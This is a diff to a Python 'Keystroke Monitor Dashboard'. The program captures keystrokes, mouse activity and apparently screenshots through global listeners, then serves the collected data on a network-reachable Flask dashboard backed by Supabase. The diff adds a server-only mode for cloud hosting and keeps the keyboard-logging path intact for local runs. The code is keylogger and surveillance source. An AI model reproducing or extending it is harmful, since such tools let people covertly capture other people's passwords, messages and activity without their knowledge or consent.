@@ -4,9 +4,18 @@ import time
 import socket
 import ctypes
 import threading
-import pynput
 from datetime import datetime
-from PIL import ImageGrab
+
+# Try imports for headless server compatibility (Render)
+try:
+    import pynput
+except ImportError:
+    pynput = None
+
+try:
+    from PIL import ImageGrab
+except ImportError:
+    ImageGrab = None
 from flask import Flask, jsonify, send_from_directory, render_template_string, request
 from dotenv import load_dotenv
 from supabase import create_client, Client
@@ -1617,35 +1626,43 @@ def get_local_ip():
         return "127.0.0.1"
 
 def run_server():
-    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
 
 if __name__ == '__main__':
-    # Run log migration to fix any literal newlines
-    migrate_literal_newlines()
+    # Check if we should only run the server (no local keyboard/mouse listeners)
+    server_only = os.environ.get('SERVER_ONLY', 'false').lower() == 'true' or pynput is None
     
-    # Start Flask server in a daemon thread
-    server_thread = threading.Thread(target=run_server, daemon=True)
-    server_thread.start()
-    
-    # Start periodic activity checker thread
-    checker_thread = threading.Thread(target=periodic_checker, daemon=True)
-    checker_thread.start()
-    
-    # Start mouse activity listener thread
-    mouse_listener = pynput.mouse.Listener(
-        on_move=on_mouse_activity,
-        on_click=on_mouse_activity,
-        on_scroll=on_mouse_activity
-    )
-    mouse_listener.start()
-    
-    local_ip = get_local_ip()
-    print(f"\n==================================================")
-    print(f"Keystroke Monitor Dashboard is active.")
-    print(f"Access locally: http://localhost:5000")
-    print(f"Access on WiFi: http://{local_ip}:5000")
-    print(f"==================================================\n")
-    
-    # Start keyboard listener in main thread
-    with pynput.keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
+    if server_only:
+        print("Running in SERVER ONLY mode (Dashboard Web UI). Keylog hooks disabled.")
+        run_server()
+    else:
+        # Run log migration to fix any literal newlines
+        migrate_literal_newlines()
+        
+        # Start Flask server in a daemon thread
+        server_thread = threading.Thread(target=run_server, daemon=True)
+        server_thread.start()
+        
+        # Start periodic activity checker thread
+        checker_thread = threading.Thread(target=periodic_checker, daemon=True)
+        checker_thread.start()
+        
+        # Start mouse activity listener thread
+        mouse_listener = pynput.mouse.Listener(
+            on_move=on_mouse_activity,
+            on_click=on_mouse_activity,
+            on_scroll=on_mouse_activity
+        )
+        mouse_listener.start()
+        
+        local_ip = get_local_ip()
+        print(f"\n==================================================")
+        print(f"Keystroke Monitor Dashboard is active.")
+        print(f"Access locally: http://localhost:5000")
+        print(f"Access on WiFi: http://{local_ip}:5000")
+        print(f"==================================================\n")
+        
+        # Start keyboard listener in main thread
+        with pynput.keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
